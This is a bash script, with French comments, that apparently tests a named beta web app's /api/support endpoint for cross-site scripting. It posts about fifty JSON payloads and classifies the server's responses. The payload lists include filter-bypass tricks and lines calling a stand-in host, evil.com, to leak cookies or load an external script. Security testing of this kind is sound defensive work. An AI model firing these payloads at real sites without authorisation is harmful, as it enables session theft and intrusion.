#!/bin/bash

# Enhanced XSS Testing Script for /api/support endpoint
# Usage: ./enhanced_xss_test.sh
# Tests comprehensive XSS vulnerabilities on app.beta.v2.helloquitx.com/api/support

TARGET="https://app.beta.v2.helloquitx.com"
ENDPOINT="/api/support"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
OUTPUT_FILE="enhanced_xss_test_support_${TIMESTAMP}.txt"

echo "=== ENHANCED XSS TESTING ON /api/support ===" | tee $OUTPUT_FILE
echo "Date: $(date)" | tee -a $OUTPUT_FILE
echo "Target: $TARGET$ENDPOINT" | tee -a $OUTPUT_FILE
echo

# Variables pour le résumé
TEST_COUNT=0
RESULTS_SUMMARY=()
FAILED_TESTS=()
FAILED_DETAILS=()

# Check if target is accessible
echo "[0] Test de connectivité de base..." | tee -a $OUTPUT_FILE
response=$(curl -s -w "HTTP:%{http_code}" $TARGET$ENDPOINT 2>/dev/null)
http_code=$(echo "$response" | tail -1 | grep -o "HTTP:[0-9]*" | cut -d: -f2)
echo "Connectivité - Code HTTP: $http_code" | tee -a $OUTPUT_FILE

# Fonction pour exécuter un test XSS
run_xss_test() {
  local payload="$1"
  local description="$2"
  local expected="$3"
  
  TEST_COUNT=$((TEST_COUNT + 1))
  
  # Exécuter la requête avec timeout
  local temp_response="/tmp/curl_response_$$"
  local temp_headers="/tmp/curl_headers_$$"
  
  local start_time=$(date +%s.%N)
  
  local http_code=$(curl -s -X POST \
      -H "Content-Type: application/json" \
      -H "User-Agent: Mozilla/5.0 (compatible; SecurityTest/1.0)" \
      -d "$payload" \
      -w "%{http_code}" \
      -o "$temp_response" \
      -D "$temp_headers" \
      -m 10 \
      $TARGET$ENDPOINT 2>/dev/null)
  
  local end_time=$(date +%s.%N)
  local response_time=$(echo "$end_time - $start_time" | bc)
  
  # Lire le contenu de la réponse
  local content=""
  if [ -f "$temp_response" ]; then
      content=$(cat "$temp_response")
  fi
  
  # Nettoyer les fichiers temporaires
  rm -f "$temp_response" "$temp_headers"

  # Extraire les messages d'erreur et détails du JSON
  local error_msg=""
  local details_msg=""
  
  if [ -z "$content" ]; then
      error_msg="(empty response)"
  else
      # Extraire le champ error
      if echo "$content" | grep -q '"error"'; then
          error_msg=$(echo "$content" | sed -n 's/.*"error" *: *"\([^"]*\)".*/\1/p')
      fi
      
      # Extraire le tableau details
      if echo "$content" | grep -q '"details"'; then
          local details_raw=$(echo "$content" | sed -n 's/.*"details" *: *\[\([^]]*\)\].*/\1/p')
          if [ -n "$details_raw" ]; then
              details_msg=$(echo "$details_raw" | sed 's/"//g' | sed 's/, */ | /g')
          fi
      fi
      
      # Extraire le champ message (pour d'autres types d'erreurs)
      if [ -z "$error_msg" ] && echo "$content" | grep -q '"message"'; then
          error_msg=$(echo "$content" | sed -n 's/.*"message" *: *"\([^"]*\)".*/\1/p')
      fi
      
      # Si pas de données structurées, afficher le contenu brut
      if [ -z "$error_msg" ] && [ -z "$details_msg" ]; then
          error_msg=$(echo "$content" | tr -d '\n\r' | cut -c1-80)
      fi
  fi

  # Analyser la réponse selon la logique XSS
  local result_emoji=""
  local result_text=""
  
  # Temps de réponse suspect (peut indiquer une injection réussie)
  if (( $(echo "$response_time > 2.5" | bc -l) )); then
      result_emoji="🚨"
      result_text="TEMPS DE RÉPONSE SUSPECT - VULNÉRABILITÉ POTENTIELLE!"
  elif [ "$http_code" = "200" ]; then
      if echo "$content" | grep -qi "success.*true\|created\|submitted"; then
          result_emoji="🚨"
          result_text="PAYLOAD XSS ACCEPTÉ - VULNÉRABILITÉ CRITIQUE!"
      else
          result_emoji="❓"
          result_text="RÉPONSE AMBIGUË - À ANALYSER"
      fi
  elif [ "$http_code" = "400" ]; then
      if echo "$content" | grep -qi "security.*validation\|xss.*detected\|html.*tags\|dangerous.*content"; then
          result_emoji="✅"
          result_text="XSS DÉTECTÉ ET BLOQUÉ - SÉCURITÉ FONCTIONNELLE"
      else
          result_emoji="✅"
          result_text="BAD REQUEST - VALIDATION FONCTIONNELLE"
      fi
  elif [ "$http_code" = "403" ]; then
      result_emoji="✅"
      result_text="ACCÈS INTERDIT - SÉCURITÉ FONCTIONNELLE"
  elif [ "$http_code" = "422" ]; then
      result_emoji="✅"
      result_text="VALIDATION ÉCHOUÉE - SÉCURITÉ FONCTIONNELLE"
  elif [ "$http_code" = "500" ]; then
      result_emoji="🚨"
      result_text="ERREUR SERVEUR - POTENTIELLEMENT VULNÉRABLE!"
  elif [ "$http_code" = "404" ]; then
      result_emoji="❌"
      result_text="ENDPOINT NON TROUVÉ"
  elif [ "$http_code" = "429" ]; then
      result_emoji="⚡"
      result_text="LIMITE DE TAUX - PROTECTION ACTIVE"
  elif [ -z "$http_code" ]; then
      result_emoji="❌"
      result_text="AUCUNE RÉPONSE - PROBLÈME DE CONNECTIVITÉ"
  else
      result_emoji="⚠️"
      result_text="CODE INATTENDU $http_code"
  fi

  # Ajouter au résumé
  RESULTS_SUMMARY+=("$TEST_COUNT.$result_emoji")
  
  # Affichage console - COMPORTEMENT COMME LE SCRIPT AUTH : tous les emojis s'affichent
  echo -n "$TEST_COUNT.$result_emoji "
  
  # Stocker les détails SEULEMENT pour les tests qui ont vraiment échoué
  if [ "$result_emoji" != "✅" ]; then
      # Stocker les détails du test échoué
      local failure_summary="$TEST_COUNT.$result_emoji $description - $result_text"
      
      # Formater les détails d'erreur pour l'affichage
      local error_details=""
      if [ -n "$error_msg" ] && [ -n "$details_msg" ]; then
          error_details="$error_msg | $details_msg"
      elif [ -n "$error_msg" ]; then
          error_details="$error_msg"
      elif [ -n "$details_msg" ]; then
          error_details="$details_msg"
      else
          error_details="(pas de détails d'erreur)"
      fi
      
      # Créer un détail complet pour ce test échoué
      local failure_detail="
═══════════════════════════════════════════════════════════════
Test #$TEST_COUNT: $description
═══════════════════════════════════════════════════════════════
• Méthode: POST
• URL: $TARGET$ENDPOINT
• Payload envoyé:
  $payload
• Attendu: $expected
• Code HTTP reçu: $http_code (temps: ${response_time}s)
• Résultat: $result_text
• Détails d'erreur: $error_details
• Réponse complète du serveur:
$(echo "$content" | sed 's/^/  /')
═══════════════════════════════════════════════════════════════"
      
      FAILED_TESTS+=("$failure_summary")
      FAILED_DETAILS+=("$failure_detail")
  fi

  # Pause pour éviter le rate limiting
  if [ "$result_emoji" = "⚡" ]; then
      sleep 3
  else
      sleep 0.2
  fi
}

# Test d'injection XSS classiques
echo "[1] Tests d'injection XSS classiques..." | tee -a $OUTPUT_FILE

classic_xss_payloads=(
    '{"subject":"Test Subject","message":"<script>alert(1)</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<img src=x onerror=alert(1)>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<svg onload=alert(1)>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<iframe src=javascript:alert(1)>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<body onload=alert(1)>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<div onclick=alert(1)>Click me</div>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"javascript:alert(1)","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script>console.log(\"XSS_TEST_SUCCESS\")</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script>document.cookie=\"hacked=true\"</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script>window.location=\"http://evil.com?cookie=\"+document.cookie</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script>eval(atob(\"YWxlcnQoMSk=\"))</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<ScRiPt>alert(1)</ScRiPt>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script>ale\\u0072t(1)</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script>window[\"ale\"+\"rt\"](1)</script>","email":"test@test.com"}'
)

classic_descriptions=(
    "Script basique avec alert"
    "Image avec onerror"
    "SVG avec onload"
    "Iframe avec javascript"
    "Body avec onload"
    "Div avec onclick"
    "Protocole javascript"
    "Script avec console.log"
    "Script modifiant cookie"
    "Script de redirection"
    "Script encodé base64"
    "Script avec unicode"
    "Script avec casse mixte"
    "Script avec unicode escape"
    "Script avec concaténation"
)

for i in "${!classic_xss_payloads[@]}"; do
    run_xss_test "${classic_xss_payloads[$i]}" "${classic_descriptions[$i]}" "Devrait être bloqué"
done

# Tests XSS basés sur les protocoles
echo "[2] Tests XSS basés sur les protocoles..." | tee -a $OUTPUT_FILE

protocol_xss_payloads=(
    '{"subject":"Test Subject","message":"data:text/html,<script>alert(1)</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"vbscript:alert(1)","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"livescript:alert(1)","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"mocha:alert(1)","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<iframe src=\"data:text/html,<script>alert(1)</script>\">","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<object data=\"data:text/html,<script>alert(1)</script>\">","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<embed src=\"data:text/html,<script>alert(1)</script>\">","email":"test@test.com"}'
)

protocol_descriptions=(
    "Data URL avec script"
    "Data URL base64 encodé"
    "Protocole VBScript"
    "Protocole LiveScript"
    "Protocole Mocha"
    "Iframe avec data URL"
    "Object avec data URL"
    "Embed avec data URL"
)

for i in "${!protocol_xss_payloads[@]}"; do
    run_xss_test "${protocol_xss_payloads[$i]}" "${protocol_descriptions[$i]}" "Devrait être bloqué"
done

# Tests de contournement de filtres
echo "[3] Tests de contournement de filtres..." | tee -a $OUTPUT_FILE

bypass_xss_payloads=(
    '{"subject":"Test Subject","message":"<scr<!---->ipt>alert(1)</scr<!---->ipt>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<scr\u0000ipt>alert(1)</scr\u0000ipt>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script/src=data:,alert(1)>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script src=//evil.com></script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script>al\\u0065rt(1)</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script>\\u0061lert(1)</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script>ale\\x72t(1)</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script>\\x61lert(1)</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<script>eval(\\u0027alert(1)\\u0027)</script>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<svg><script>alert&NewLine;(1)</script></svg>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<svg><script>alert(1)//</script></svg>","email":"test@test.com"}'
)

bypass_descriptions=(
    "Script avec commentaires HTML"
    "Script avec caractère null"
    "Script avec attribut src"
    "Script avec source externe"
    "Unicode escape dans fonction"
    "Unicode escape au début"
    "Hex escape dans fonction"
    "Hex escape au début"
    "Eval avec unicode"
    "Script avec nouvelle ligne"
    "Script avec commentaire"
)

for i in "${!bypass_xss_payloads[@]}"; do
    run_xss_test "${bypass_xss_payloads[$i]}" "${bypass_descriptions[$i]}" "Devrait être bloqué"
done

# Tests XSS basés sur les attributs
echo "[4] Tests XSS basés sur les attributs..." | tee -a $OUTPUT_FILE

attribute_xss_payloads=(
    '{"subject":"Test Subject","message":"\\\" onmouseover=\\\"alert(1)","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"\\u0027 onfocus=\\u0027alert(1)","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"\\u0060 onload=\\u0060alert(1)","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<input onfocus=alert(1) autofocus>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<input onblur=alert(1) autofocus><input autofocus>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<select onfocus=alert(1) autofocus>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<textarea onfocus=alert(1) autofocus>","email":"test@test.com"}'
    '{"subject":"Test Subject","message":"<keygen onfocus=alert(1) autofocus>","email":"test@test.com"}'
)

attribute_descriptions=(
    "Attribut onmouseover échappé"
    "Attribut onfocus avec unicode"
    "Attribut onload avec backtick"
    "Input avec onfocus autofocus"
    "Input avec onblur cascade"
    "Select avec onfocus"
    "Textarea avec onfocus"
    "Keygen avec onfocus"
)

for i in "${!attribute_xss_payloads[@]}"; do
    run_xss_test "${attribute_xss_payloads[$i]}" "${attribute_descriptions[$i]}" "Devrait être bloqué"
done

# Tests XSS dans le champ subject
echo "[5] Tests XSS dans le champ subject..." | tee -a $OUTPUT_FILE

subject_xss_payloads=(
    '{"subject":"<script>alert(1)</script>","message":"Test message","email":"test@test.com"}'
    '{"subject":"<img src=x onerror=alert(1)>","message":"Test message","email":"test@test.com"}'
    '{"subject":"<svg onload=alert(1)>","message":"Test message","email":"test@test.com"}'
    '{"subject":"<iframe src=javascript:alert(1)>","message":"Test message","email":"test@test.com"}'
    '{"subject":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e","message":"Test message","email":"test@test.com"}'
    '{"subject":"<details open ontoggle=alert(1)>","message":"Test message","email":"test@test.com"}'
)

subject_descriptions=(
    "Script dans subject"
    "Image dans subject"
    "SVG dans subject"
    "Iframe dans subject"
    "Script unicode dans subject"
    "Details dans subject"
)

for i in "${!subject_xss_payloads[@]}"; do
    run_xss_test "${subject_xss_payloads[$i]}" "${subject_descriptions[$i]}" "Devrait être bloqué"
done

# Tests XSS dans le champ email
echo "[6] Tests XSS dans le champ email..." | tee -a $OUTPUT_FILE

email_xss_payloads=(
    '{"subject":"Test Subject","message":"test","email":"<script>alert(1)</script>@test.com"}'
    '{"subject":"Test Subject","message":"test","email":"test+<img src=x onerror=alert(1)>@test.com"}'
    '{"subject":"Test Subject","message":"test","email":"\\\"<script>alert(1)</script>\\\"@test.com"}'
    '{"subject":"Test Subject","message":"test","email":"test@<script>alert(1)</script>.com"}'
    '{"subject":"Test Subject","message":"test","email":"test@test.<svg onload=alert(1)>.com"}'
    '{"subject":"Test Subject","message":"test","email":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e@test.com"}'
)

email_descriptions=(
    "Script avant arobase"
    "Image dans partie locale"
    "Script échappé dans email"
    "Script dans domaine"
    "SVG dans extension"
    "Script unicode dans email"
)

for i in "${!email_xss_payloads[@]}"; do
    run_xss_test "${email_xss_payloads[$i]}" "${email_descriptions[$i]}" "Devrait être bloqué"
done

echo
echo

# Afficher le résumé des échecs SEULEMENT s'il y en a
if [ ${#FAILED_TESTS[@]} -gt 0 ]; then
    echo "RÉSUMÉ DES TESTS ÉCHOUÉS:" | tee -a $OUTPUT_FILE
    echo "=========================" | tee -a $OUTPUT_FILE
    for failure in "${FAILED_TESTS[@]}"; do
        echo "$failure" | tee -a $OUTPUT_FILE
    done
    
    echo | tee -a $OUTPUT_FILE
    echo "DÉTAILS COMPLETS DES TESTS ÉCHOUÉS:" | tee -a $OUTPUT_FILE
    echo "===================================" | tee -a $OUTPUT_FILE
    
    for detail in "${FAILED_DETAILS[@]}"; do
        echo "$detail" | tee -a $OUTPUT_FILE
        echo | tee -a $OUTPUT_FILE
    done
fi

echo
echo "=============================================="
echo "TEST XSS TERMINÉ!"
echo "=============================================="
echo "Rapport complet sauvegardé: $OUTPUT_FILE"
echo
echo "📊 RÉSUMÉ RAPIDE DES TESTS:"
echo "$(printf '%s ' "${RESULTS_SUMMARY[@]}")"
echo
echo "🔍 LÉGENDE:"
echo "✅ = Sécurisé (validation fonctionnelle)"
echo "⚠️ = Attention (payload accepté)"
echo "🚨 = Vulnérabilité critique détectée"
echo "❌ = Erreur technique"
echo "❓ = À analyser manuellement"
echo "⚡ = Rate limiting actif"

# Compter les résultats
SECURE_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "✅")
WARNING_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "⚠️")
CRITICAL_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "🚨")
ERROR_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "❌")
AMBIGUOUS_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "❓")
RATELIMIT_COUNT=$(printf '%s\n' "${RESULTS_SUMMARY[@]}" | grep -c "⚡")

echo
echo "📈 STATISTIQUES:"
echo "Tests sécurisés: $SECURE_COUNT/$TEST_COUNT"
echo "Tests avec attention: $WARNING_COUNT/$TEST_COUNT"
echo "Vulnérabilités critiques: $CRITICAL_COUNT/$TEST_COUNT"
echo "Erreurs techniques: $ERROR_COUNT/$TEST_COUNT"
echo "Tests ambigus: $AMBIGUOUS_COUNT/$TEST_COUNT"
echo "Rate limiting: $RATELIMIT_COUNT/$TEST_COUNT"

if [ "$CRITICAL_COUNT" -gt 0 ]; then
    echo
    echo "🚨 ALERTE: $CRITICAL_COUNT vulnérabilité(s) XSS critique(s) détectée(s)!"
elif [ "$WARNING_COUNT" -gt 0 ]; then
    echo
    echo "⚠️ ATTENTION: $WARNING_COUNT payload(s) XSS accepté(s)!"
else
    echo
    echo "✅ Aucune vulnérabilité XSS critique détectée dans ces tests."
fi

exit 0